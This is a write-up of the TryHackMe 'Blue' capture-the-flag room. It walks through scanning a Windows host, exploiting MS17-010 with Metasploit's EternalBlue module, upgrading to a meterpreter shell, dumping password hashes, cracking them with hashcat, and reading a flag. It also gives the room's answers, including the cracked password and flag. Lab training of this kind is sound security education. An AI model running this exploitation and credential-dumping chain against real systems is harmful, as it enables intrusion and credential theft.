[blue - TryHackMe](https://tryhackme.com/room/blue) | Cya-nyde
==============================================================

## Recon

### How many ports are open with a port number under 1000?

- <code>nmap -p 1-1000 *target ip*</code> to list all open ports under port 1000

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

> There are **3** results returned

### What is this machine vulnerable to?

- <code>sudo nmap -sV -script=vuln -T5 -p 135,139,445 *target ip*</code> to run vuln scan on discovered open ports


```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 16:FF:CE:C9:65:03 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

```

> The scan shows that the target is vulnerable to **ms17-010**

## Gain Access

- Use `msfconsole` to open *metasploit*

### Find the exploitation code we will run against the machine. What is the full path of the code? 

- `search ms17-010` to list metasploit modules related to this exploit

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

> The full path to the exploit is **exploit/windows/smb/ms17_010_eternalblue**

### Show options and set the one required value. What is the name of this value?

- `use 0` or `use exploit/windows/smb/ms17_010_eternalblue` to use the eternalblue module
- `show options` to list options

> The only empty option that we need to change is **RHOSTS**

## Escalate

### Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use?

- *ctrl + z* to background session after initial foothold on target
- `search type:post shell to meterpreter` to find module to stabilize shell

> The module to use is called **post/multi/manage/shell_to_meterpreter**

### Select this (use MODULE_PATH). Show options, what option are we required to change?

> The option that needs to be set is **SESSION**

- Confirm access level using `getsystem`
   - Should be running as SYSTEM
- List running processes using `ps`
- Migrate to a process with NT AUTHORITY\SYSTEM with `migrate *process id*`

## Cracking

### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

> <code>hashdump</code> returns three users: Administrator, Guest, and **Jon**

### Copy this password hash to a file and research how to crack it. What is the cracked password?

- `echo "*hash value*" > temp` to create a temp file with the password hash
- `hashcat temp` to crack the password hash in the temp file

> The cracked password returned from *hashcat* is **alqfna22**

## Find Flags

### Flag 1

> <details><summary><code>cat C:/flag1.txt</code> to get the flag: </summary>flag{access_the_machine}</details>